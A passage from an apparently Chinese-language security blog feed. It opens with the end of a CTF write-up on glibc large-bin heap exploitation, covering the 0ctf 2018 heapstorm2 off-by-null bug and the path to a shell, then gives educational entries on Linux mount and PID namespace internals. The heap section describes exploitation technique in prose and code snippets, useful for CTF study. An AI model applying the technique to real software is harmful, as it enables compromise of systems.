victim_index);</span><br><span class="line"><span class="comment">// 更新普通链表</span></span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<p>从源码中可以看出，Large Bin在更新链表的时候，没有freed chunk中的链表数据的进行任何的安全检查，利用这一点，可以向指定地址写入堆地址数据。利用对齐的特性向堆上写入0x56开头的堆地址，则可以在特定位置制造一个空闲的0x56大小的chunk。当申请0x48大小的chunk时（并触发unsorted bin一系列操作后），特定位置的chunk将会被取出。</p>
<p>同时，利用这个漏洞，也可向特定位置写入特定数值。</p>
<h4 id="0x55与0x56"><a href="#0x55与0x56" class="headerlink" title="0x55与0x56"></a>0x55与0x56</h4><p>64位下，PIE和randomize_va_space对地址的影响：</p>
<ul>
<li>0表示关闭地址空间随机化</li>
<li>1表示对mmap的基地址、栈地址和vdso地址随机化</li>
<li>2表示在1的基础上对堆地址随机化</li>
</ul>
<p>当程序开启PIE且系统支持地址随机化时，堆地址的非零最高位会在0x55和0x56之间随机。这两个数字对于<code>calloc()</code>来说，只有0x56能够通过检查。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">assert (!mem || chunk_is_mmapped (mem2chunk (mem)) ||</span><br><span class="line">        av == arena_for_chunk (mem2chunk (mem)));</span><br></pre></td></tr></table></figure>

<h4 id="0ctf2018-heapstorm2"><a href="#0ctf2018-heapstorm2" class="headerlink" title="0ctf2018 heapstorm2"></a>0ctf2018 heapstorm2</h4><p>明显的<code>off-by-null</code>漏洞。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">input_string(chunk, size);</span><br><span class="line">remainder_space = size + chunk;</span><br><span class="line">*(_QWORD *)remainder_space = &#x27;ROTSPAEH&#x27;;</span><br><span class="line">*(_DWORD *)(remainder_space + 8) = &#x27;II_M&#x27;;</span><br><span class="line">*(_BYTE *)(remainder_space + <span class="number">0xC</span>) = <span class="number">0</span>;        <span class="comment">// off by null</span></span><br></pre></td></tr></table></figure>

<p>利用<code>off-by-null</code>来制造堆块重叠，从而修改已释放的chunk的链表指针数据。通过将Unsorted Bin中的Large Chunk放入Large Bin的操作，向特定地址写入0x56开头的堆地址，使得再次申请chunk时，获得特定地址的chunk，从而改写关键数据以进一步getshell。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>0ctf</tag>
        <tag>2018</tag>
      </tags>
  </entry>
  <entry>
    <title>MOUNT Namespace</title>
    <url>/2020/07/30/MNT-NS/</url>
    <content><![CDATA[<p>About Linux Mount Namespace source code.</p>
<a id="more"></a>

<h3 id="0x00-Basis"><a href="#0x00-Basis" class="headerlink" title="0x00 Basis"></a>0x00 Basis</h3><p>Namespace 核心结构体于 task_struct 当中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">/* Namespaces: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nsproxy</span>          *<span class="title">nsproxy</span>;</span></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nsproxy</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uts_namespace</span> *<span class="title">uts_ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ipc_ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mnt_namespace</span> *<span class="title">mnt_ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid_namespace</span> *<span class="title">pid_ns_for_children</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">net</span>       *<span class="title">net_ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cgroup_namespace</span> *<span class="title">cgroup_ns</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mnt_namespace</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>        count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ns_common</span>    <span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mount</span> *  <span class="title">root</span>;</span> <span class="comment">// 根目录挂载点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">list</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span>   *<span class="title">user_ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucounts</span>      *<span class="title">ucounts</span>;</span></span><br><span class="line">    u64         seq;    <span class="comment">/* Sequence number to prevent loops */</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> poll;</span><br><span class="line">    u64 event;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        mounts; <span class="comment">/* # of mounts in the namespace */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        pending_mounts;</span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ns_common</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_long_t</span> stashed;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ns_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> inum;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_ns_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *real_ns_name;</span><br><span class="line">    <span class="keyword">int</span> type;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ns_common</span> *(*<span class="title">get</span>)(<span class="title">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>);</span></span><br><span class="line">    <span class="keyword">void</span> (*put)(struct ns_common *ns); <span class="comment">// 回调结构题</span></span><br><span class="line">    <span class="keyword">int</span> (*install)(struct nsproxy *nsproxy, struct ns_common *ns);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *(*<span class="title">owner</span>)(<span class="title">struct</span> <span class="title">ns_common</span> *<span class="title">ns</span>);</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ns_common</span> *(*<span class="title">get_parent</span>)(<span class="title">struct</span> <span class="title">ns_common</span> *<span class="title">ns</span>);</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ns_operations</span> <span class="title">mntns_operations</span> = &#123;</span></span><br><span class="line">    .name       = <span class="string">&quot;mnt&quot;</span>,</span><br><span class="line">    .type       = CLONE_NEWNS,</span><br><span class="line">    .get        = mntns_get,</span><br><span class="line">    .put        = mntns_put,</span><br><span class="line">    .install    = mntns_install,</span><br><span class="line">    .owner      = mntns_owner,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>每个 mount namespace 都有一份自己的挂载点列表。当我们使用 clone 函数或 unshare 函数并传入 CLONE_NEWNS 标志创建新的 mount namespace 时， 新 mount namespace 中的挂载点其实是从调用者所在的 mount namespace 中拷贝的。但是在新的 mount namespace 创建之后，这两个 mount namespace 及其挂载点就基本上没啥关系了(除了 shared subtree 的情况)，两个 mount namespace 是相互隔离的。</p>
<h3 id="0x01-文件系统挂载"><a href="#0x01-文件系统挂载" class="headerlink" title="0x01 文件系统挂载"></a>0x01 文件系统挂载</h3><p>Linux中使用树来组织文件系统，整个文件系统构成一棵树。整个全局系统中只有这样一棵文件树（在没有容器的情况下），这棵树描述文件系统的拓扑结构。</p>
<p>根就这颗树是其赖以生存的基础，文件系统以“/”为根。由于linux的树形文件系统是完全抽象的，因此它不和任何介质进行绑定，仅存在于内核当中，内核只要起来，这个虚拟的树就存在了，只是此时只有树根，然而linux此时可以挂载任意类型的文件系统到这个树根，linux可以在initrd中挂载任意文件系统到树根，这是因为内核和文件系统是分离的概念，内核启动并不依赖任何文件系统。</p>
<p>这棵挂载树的建立包括建立根节点“/”和挂载rootfs文件系统到根目录的过程。</p>
<p>挂载普通文件系统，就是将一个文件系统挂载（mount）到VFS目录树上的一个目录的过程，可以简单描述为将某一设备（dev_name）上某一文件系统（file_system_type）安装到VFS目录树上的一个安装点（dir_name），要解决的问题是将对VFS目录中某一目录的操作转化为具体安装到其上的实际文件系统的对应操作。</p>
<h3 id="0x02-进程的文件系统环境"><a href="#0x02-进程的文件系统环境" class="headerlink" title="0x02 进程的文件系统环境"></a>0x02 进程的文件系统环境</h3><p>每个进程都有一个它自己当前的工作目录和自己的根目录，这是内核用来表示进程和文件系统相互作用所必须维护的数据。相关信息保存在fs_struct结构体中，在进程的task_struct中保存着当前进程的fs_struct的指针。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> users;</span><br><span class="line">	<span class="keyword">spinlock_t</span> lock;</span><br><span class="line">	<span class="keyword">seqcount_t</span> seq;</span><br><span class="line">	<span class="keyword">int</span> umask;</span><br><span class="line">	<span class="keyword">int</span> in_exec;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span> <span class="title">root</span>, <span class="title">pwd</span>;</span></span><br><span class="line">    <span class="comment">// path用于存放着目录的目录项和文件系统对象信息</span></span><br><span class="line">    <span class="comment">// 其中root对应着当前进程所在的根目录，pwd则是对应进程的当前目录</span></span><br><span class="line">&#125; __randomize_layout; <span class="comment">// kernel 5.7.10 </span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sunichi/img-upload-for-picgo/master/ns/mntns1.jpg"></p>
<p>每一个进程都有自己的namespace，mnt_namespace中是这个命名空间中的根文件系统的挂载实例。对于每一个mount的文件系统，内核中都有一个struct mount数据结构来表示，所有的mount，都存在于一个hash table中，他们通过一个hash数组组织在一起。</p>
<p><img src="https://raw.githubusercontent.com/sunichi/img-upload-for-picgo/master/ns/mntns2.jpg"></p>
<p>对于mount的文件系统，会有在一个文件系统上mount另外一个文件系统的情况，这种情况，可以称原文件系统为父vfsmount， 对于mount上的文件系统，称之为子文件系统。</p>
<p><img src="https://raw.githubusercontent.com/sunichi/img-upload-for-picgo/master/ns/mntns3.jpg"></p>
<p>每一个挂载的文件系统，都有一个mount实例来表示。系统中mount一个文件系统时，首先会创建一个文件系统的的mount实例。在mount实例中的vfsmount存放着这个文件系统相关的挂载点的基本信息。mnt_root指向本文件系统的根路径dentry，mnt_sb指向本文件系统的超级块。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mnt_namespace</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>		count;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ns_common</span>	<span class="title">ns</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mount</span> *	<span class="title">root</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span>	*<span class="title">user_ns</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ucounts</span>		*<span class="title">ucounts</span>;</span></span><br><span class="line">	u64			seq;	<span class="comment">/* Sequence number to prevent loops */</span></span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> poll;</span><br><span class="line">	u64 event;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		mounts; <span class="comment">/* # of mounts in the namespace */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		pending_mounts;</span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mount</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> <span class="title">mnt_hash</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mount</span> *<span class="title">mnt_parent</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">mnt_mountpoint</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vfsmount</span> <span class="title">mnt</span>;</span></span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">mnt_rcu</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span> <span class="title">mnt_llist</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mnt_pcp</span> __<span class="title">percpu</span> *<span class="title">mnt_pcp</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">int</span> mnt_count;</span><br><span class="line">	<span class="keyword">int</span> mnt_writers;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_mounts</span>;</span>	<span class="comment">/* list of children, anchored here */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_child</span>;</span>	<span class="comment">/* and going through their mnt_child */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_instance</span>;</span>	<span class="comment">/* mount instance on sb-&gt;s_mounts */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *mnt_devname;	<span class="comment">/* Name of device e.g. /dev/dsk/hda1 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_expire</span>;</span>	<span class="comment">/* link in fs-specific expiry list */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_share</span>;</span>	<span class="comment">/* circular list of shared mounts */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_slave_list</span>;</span><span class="comment">/* list of slave mounts */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_slave</span>;</span>	<span class="comment">/* slave list entry */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mount</span> *<span class="title">mnt_master</span>;</span>	<span class="comment">/* slave is on master-&gt;mnt_slave_list */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mnt_namespace</span> *<span class="title">mnt_ns</span>;</span>	<span class="comment">/* containing namespace */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mountpoint</span> *<span class="title">mnt_mp</span>;</span>	<span class="comment">/* where is it mounted */</span></span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> <span class="title">mnt_mp_list</span>;</span>	<span class="comment">/* list mounts with the same mountpoint */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> <span class="title">mnt_umount</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_umounting</span>;</span> <span class="comment">/* list entry for umount propagation */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_FSNOTIFY</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fsnotify_mark_connector</span> __<span class="title">rcu</span> *<span class="title">mnt_fsnotify_marks</span>;</span></span><br><span class="line">	__u32 mnt_fsnotify_mask;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">int</span> mnt_id;			<span class="comment">/* mount identifier */</span></span><br><span class="line">	<span class="keyword">int</span> mnt_group_id;		<span class="comment">/* peer group identifier */</span></span><br><span class="line">	<span class="keyword">int</span> mnt_expiry_mark;		<span class="comment">/* true if marked for expiry */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span> <span class="title">mnt_pins</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span> <span class="title">mnt_stuck_children</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<h3 id="0x03-命名空间"><a href="#0x03-命名空间" class="headerlink" title="0x03 命名空间"></a>0x03 命名空间</h3><p>Mount namespaces (Linux2.4.19) 隔离一组进程的文件系统层次。在使用了新 Mount Namespaces 后，mount() 和 umount() 就会在新的文件系统层次上操作，而不是在全局（默认）文件系统层次上。</p>
<p>每个 mnt_namespace 有自己独立的 <code>mount *root</code> ，即根挂载点是互相独立的，同时由 mount-&gt;mnt_child 串接起来的子 mnt 链表，以及继续往下都是彼此独立的，产生的外在效果就是某个 mnt_namespace 中的 mount、 umount 不会对其他 namespace 产生影响，因为整个mount树是每个 namespace 各有一份，彼此间无干扰， path lookup 也在各自的 mount 树中进行。这里和 chroot 之类的操作不一样， chroot 改变的只是 task_struct 相关的 fs_struct 中的root，影响的是 path lookup 的起始点，对整个 mount 树并无关系。</p>
<blockquote>
<p>chroot 的环境只隔离文件系统，使用 ps 仍然会将系统上的所有进程列出。而 namespace 提供的是一个全新的挂在树。</p>
</blockquote>
<p>不同的 mnt_namespace 可以引用不同的根文件系统，组织不同的文件系统挂载树，形成不同的目录结构。一般而言，新创建的进程总是与其父进程共用 mnt_namespace 。而所有进程都是1号进程 (init) 的子孙进程，则一般情况下所有进程都使用相同的 mnt_namespace ，都存在于相同的目录结构中。</p>
<p>但是在通过 clone 系统调用创建新进程时，可以指定 CLONE_NEWNS 标志，为子进程创建新的名字空间（其中就包含了 mnt_namespace ，此外名字空间还有其他内容）。</p>
<h3 id="0x04-pivot-root和root"><a href="#0x04-pivot-root和root" class="headerlink" title="0x04 pivot_root和root"></a>0x04 pivot_root和root</h3><p>chroot 即 change root directory  (更改 root 目录)。在 Linux 系统中，系统默认的目录结构都是 / ，即以根 (root) 开始的。而在使用 chroot 之后，系统的目录结构将以指定的位置作为 / 位置。</p>
<p>pivot_root 和 chroot 的主要区别是，pivot_root 主要是把整个系统切换到一个新的 root 目录，而移除对之前 root 文件系统的依赖，这样你就能够 umount 原先的 root 文件系统。而 chroot 是针对某个进程，而系统的其它部分依旧运行于老的 root 目录。</p>
<p>但 pivot_root 只能针对具体设备上的目录进行操作，因此 LXC 中的 pivot_root 不能支持使用 ramfs 作为容器的 rootfs 来启动容器。</p>
<blockquote>
<p>参考资料：</p>
<p><a href="https://www.jianshu.com/p/f288d6fe7528">https://www.jianshu.com/p/f288d6fe7528</a></p>
<p><a href="https://www.cnblogs.com/sparkdev/p/9424649.html">https://www.cnblogs.com/sparkdev/p/9424649.html</a></p>
<p><a href="https://blog.csdn.net/tanzhe2017/article/details/81001981">https://blog.csdn.net/tanzhe2017/article/details/81001981</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>kernel</tag>
        <tag>namespace</tag>
      </tags>
  </entry>
  <entry>
    <title>PID Namespace</title>
    <url>/2020/07/29/PID-NS/</url>
    <content><![CDATA[<p>About Linux PID Namespace source code.</p>
<a id="more"></a>

<h3 id="0x00-PID-框架设计"><a href="#0x00-PID-框架设计" class="headerlink" title="0x00 PID 框架设计"></a>0x00 PID 框架设计</h3><p>内核的大量数据结构被哈希表和链表链接起来，最主要的目的就是在于查找。可想而知一个好的框架，应该要考虑到检索速度，还有考虑功能的划分。在 PID 框架中，主要考虑以下几个因素：</p>
<ul>
<li>如何通过 task_struct 快速找到对应的 pid</li>
<li>如何通过 pid 快速找到对应的 task_struct</li>
<li>如何快速的分配一个唯一的 pid</li>
</ul>
<h3 id="0x01-原始-PID-框架"><a href="#0x01-原始-PID-框架" class="headerlink" title="0x01 原始 PID 框架"></a>0x01 原始 PID 框架</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    .....</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    .....</span><br><span class="line">&#125; <span class="comment">// Kernel 2.4</span></span><br></pre></td></tr></table></figure>

<p>一个进程对应一个 pid ，可以通过 task_struct 轻松找到 pid 。但通过 pid 查找 task_struct 难以实现。</p>
<h3 id="0x02-引入-hlist-和-pid-位图"><a href="#0x02-引入-hlist-和-pid-位图" class="headerlink" title="0x02 引入 hlist 和 pid 位图"></a>0x02 引入 hlist 和 pid 位图</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">pidhash</span>[<span class="title">PIDHASH_SZ</span>];</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pidmap</span> &#123;</span></span><br><span class="line">        <span class="keyword">atomic_t</span> nr_free;  <span class="comment">//表示当前可用的pid个数</span></span><br><span class="line">        <span class="keyword">void</span> *page;  <span class="comment">//用来存放位图</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>使用了 pid 位图，标记 pid 是否可用， pid 位图的方式更加节约内存。通过将每一位设置为 0 或者是 1 ，可以用来表示是否可用，第 1 位的 0 和 1 用来表示 pid 为 1 是否可用，以此类推。</p>
<p><img src="https://github.com/sunichi/hexo_images/blob/master/blog/pid_ns/pidhash_pidmap_struct.jpg?raw=true"></p>
<h3 id="0x03-引入-PID-类型"><a href="#0x03-引入-PID-类型" class="headerlink" title="0x03 引入 PID 类型"></a>0x03 引入 PID 类型</h3><p>由于一个进程除了进程 pid ，还有进程组 pid 和会话 pid ，因此引入了 pid 类型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ....</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">pid_t</span> session;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">group_leader</span>;</span></span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">signal</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ....</span><br><span class="line">    <span class="keyword">pid_t</span> __pgrp;</span><br><span class="line">    ....</span><br><span class="line">&#125; <span class="comment">// Kernel 2.6.24</span></span><br></pre></td></tr></table></figure>

<p>对于进程组 pid 来说，信号需要知道，通过这个 pid ，可以实现对一组进程进行控制，所以这个 pid 出现在了 signal 这个结构体中。无论是 session pid 还是 group pid 其实都不占用 pid 的资源，因为 session pid 是和领导进程组的组 pid 相同，而 group pid 则是和这个进程组中的领导进程的 pid 相同。</p>
<h3 id="0x04-引入-PID-命名空间后的-PID-框架"><a href="#0x04-引入-PID-命名空间后的-PID-框架" class="headerlink" title="0x04 引入 PID 命名空间后的 PID 框架"></a>0x04 引入 PID 命名空间后的 PID 框架</h3><p>随着内核不断的添加新的内核特性，尤其是 PID Namespace 机制的引入，使得 PID 存在命名空间的概念，并且命名空间还有层级的概念存在，高级别的可以被低级别的看到，这就导致高级别的进程有多个 PID 。</p>
<p>比如说在默认命名空间下，创建了一个新的命名空间，叫做 Level 1，默认命名空间这里称之为 Level 0，在 Level 1 中运行了一个进程，其在 Level 1 中的 pid 为 1。因为高级别的 pid namespace 需要被低级别的 pid namespace 所看见，所以这个进程在 Level 0 中会有另外一个 pid，假设为 xxx。套用上面说到的 pid 位图的概念，对于每一个 pid namespace 来说都应该有一个 pidmap，上文中提到的 Level 1 进程有两个 pid 一个是 1，另一个是 xxx，其中 pid 为 1 是在 Level 1 中的 pidmap 进行分配的，pid 为 xxx 则是在 Level 0 的 pidmap 中分配的。下图是整个 pid namespace 的一个框架：</p>
<p><img src="https://github.com/sunichi/hexo_images/blob/master/blog/pid_ns/pid_level.jpg?raw=true"></p>
<p>引入了 PID 命名空间后，一个 pid 就不仅仅是一个数值那么简单了，还要包含这个 pid 所在的命名空间、父命名空间和命名空间多对应的 pidmap、命名空间的 pid 等等。因此内核对 pid 做了一个封装，封装成 struct pid：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> pid_type</span><br><span class="line">&#123;</span><br><span class="line">    PIDTYPE_PID,</span><br><span class="line">    PIDTYPE_PGID,</span><br><span class="line">    PIDTYPE_SID,</span><br><span class="line">    PIDTYPE_MAX</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> level; <span class="comment">// pid 所在的层级</span></span><br><span class="line">    <span class="comment">/* lists of tasks that use this pid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span> <span class="title">tasks</span>[<span class="title">PIDTYPE_MAX</span>];</span> <span class="comment">// 一个 hash 表，分三个表头：分别是 pid 表头、进程组 pid 表头和会话 pid 表头</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">upid</span> <span class="title">numbers</span>[1];</span> </span><br><span class="line">    <span class="comment">// numbers[1] 域是一个可扩展 upid 结构体。 </span></span><br><span class="line">    <span class="comment">// 一个 PID 可以属于不同的 namespace</span></span><br><span class="line">    <span class="comment">// numbers[0] 表示 global namespace</span></span><br><span class="line">    <span class="comment">// numbers[i] 表示第 i 层 namespace，i 越大所在层级越低。</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">upid</span> &#123;</span>               <span class="comment">// 包装命名空间所抽象出来的一个结构体</span></span><br><span class="line">    <span class="keyword">int</span> nr;                 <span class="comment">// pid 在该命名空间中的 pid 数值</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid_namespace</span> *<span class="title">ns</span>;</span>       <span class="comment">// 对应的命名空间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> <span class="title">pid_chain</span>;</span>    <span class="comment">// 通过 pidhash 将一个 pid 对应的所有的命名空间连接起来.</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid_namespace</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pidmap</span> <span class="title">pidmap</span>[<span class="title">PIDMAP_ENTRIES</span>];</span>   <span class="comment">// 一个 pid 命名空间其独立的 pidmap</span></span><br><span class="line">    <span class="keyword">int</span> last_pid;               <span class="comment">// 上次分配的 pid</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_hashed; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">child_reaper</span>;</span>   <span class="comment">// 这个 pid 命名空间对应的 init 进程，因为如果父进程挂了需要找养父</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">pid_cachep</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> level;         <span class="comment">// 所在的命名空间层次</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid_namespace</span> *<span class="title">parent</span>;</span>    <span class="comment">// 父命名空间,构建命名空间的层次关系</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">proc_work</span>;</span></span><br><span class="line">    <span class="keyword">kgid_t</span> pid_gid;</span><br><span class="line">    <span class="keyword">int</span> hide_pid;</span><br><span class="line">    <span class="keyword">int</span> reboot; <span class="comment">/* group exit code if this pidns was rebooted */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> proc_inum;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

